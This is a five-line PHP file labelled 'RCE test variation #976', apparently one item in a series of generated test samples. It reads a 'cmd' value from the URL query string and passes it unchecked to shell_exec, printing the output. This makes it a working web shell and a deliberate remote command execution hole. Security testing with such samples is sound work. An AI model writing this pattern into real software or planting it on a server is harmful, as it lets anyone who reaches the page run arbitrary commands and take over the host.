<?php
// RCE test variation #976
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>